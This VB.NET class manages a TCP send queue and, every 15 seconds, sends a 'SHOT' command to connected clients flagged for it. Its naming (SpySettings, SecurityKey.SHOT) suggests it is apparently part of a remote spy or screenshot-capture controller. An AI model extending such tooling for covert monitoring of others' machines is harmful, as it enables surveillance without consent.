Public Class BegiinSend
    Public ListWorker As List(Of Object())

    Public WithEvents Bgworker As ComponentModel.BackgroundWorker

    Public SyncSend As Object = New Object()

    Private startTime As Boolean

    Private start As System.DateTime

    Public Sub New()

        Me.ListWorker = New List(Of Object())

        Me.Bgworker = New ComponentModel.BackgroundWorker

        If Not Bgworker.IsBusy Then

            Bgworker.RunWorkerAsync()

        End If

    End Sub

    Private Sub SEND(ByVal ParametersObject() As Object)

        Dim Client As Net.Sockets.TcpClient = CType(ParametersObject(0), Net.Sockets.TcpClient)

        Dim ClassClient As sockets.Client = DirectCast(ParametersObject(3), sockets.Client)

        Try

            If ClassClient IsNot Nothing Then

                SyncLock ClassClient.Lock

                    Dim errorCode As Net.Sockets.SocketError

                    Dim bByte As Byte() = Codes.FormatPacket(DirectCast(ParametersObject(1), String), DirectCast(ParametersObject(2), Byte()))

                    Client.Client.Poll(infoServer.Microseconds, Net.Sockets.SelectMode.SelectWrite)

                    Client.Client.SendBufferSize = bByte.Length

                    Client.Client.BeginSend(bByte, 0, bByte.Length, Net.Sockets.SocketFlags.None, errorCode, New AsyncCallback(AddressOf EndSend), Client)

                    If Not errorCode = Net.Sockets.SocketError.Success Then

                        If ClassClient IsNot Nothing Then

                            ClassClient.Close(Client)

                        End If

                    End If

                    infoServer.BytesSent += bByte.Length

                End SyncLock

            End If

        Catch SocketException As Net.Sockets.SocketException

            If ClassClient IsNot Nothing Then

                ClassClient.Close(Client)

            End If

        Catch SocketDisposed As System.ObjectDisposedException

            If ClassClient IsNot Nothing Then

                ClassClient.Close(Client)

            End If

        End Try

    End Sub

    Private Shared Sub EndSend(ByVal ar As IAsyncResult)

        Try

            Dim Client As Net.Sockets.TcpClient = CType(ar.AsyncState, Net.Sockets.TcpClient)

            Client.Client.EndSend(ar)

        Catch nextError As Exception

        End Try

    End Sub

    Private Sub Worker_DoWork(ByVal sender As Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bgworker.DoWork

        Do



            SyncLock sockets.Data.SyncListWorker

                Dim SyncList As List(Of Object()) = ListWorker

                If SyncList.Count > 0 Then

                    Dim ParametersObject As Object() = DirectCast(SyncList.Item(0), Object())

                    SEND(ParametersObject)

                    SyncList.RemoveAt(0)

                Else

                    If Not startTime Then

                        start = System.DateTime.Now().AddSeconds(15) ' 15s

                        startTime = True

                    Else

                        Dim result As Integer = DateTime.Compare(start, System.DateTime.Now())

                        If result < 0 Then ' -1

                            If infoServer.ClientsOnline.Count > 0 Then

                                SyncLock sockets.Data.SyncClientsOnline

                                    Dim SocketClient As sockets.Client = Nothing

                                    Try

                                        For Each sCast In infoServer.ClientsOnline

                                            If SyncList.Count > 0 Then

                                                Exit For

                                            Else

                                                Dim spl As Object() = DirectCast(sCast, Object())

                                                SocketClient = DirectCast(spl.GetValue(0), sockets.Client)

                                                If SocketClient IsNot Nothing Then

                                                    If SocketClient.shot Then

                                                        Dim Client As Net.Sockets.TcpClient = CType(spl.GetValue(1), Net.Sockets.TcpClient)

                                                        Dim Obj As Object() = {Client, SecurityKey.SHOT, Codes.Encoding().GetBytes(SecurityKey.SHOT), SocketClient}

                                                        Select Case SpySettings.FLAGS_PERFORMANCE

                                                            Case "High"

                                                                SocketClient.Async6(Obj)

                                                            Case "Normal"

                                                                SEND(Obj)

                                                            Case "Low"

                                                                SEND(Obj)

                                                        End Select

                                                    End If

                                                End If

                                            End If

                                        Next

                                    Catch ex As Exception

                                        SocketClient = Nothing

                                    End Try

                                End SyncLock

                            End If

                            startTime = False

                        End If

                    End If

                End If

            End SyncLock

            Threading.Thread.Sleep(1)

        Loop While True

    End Sub


End Class
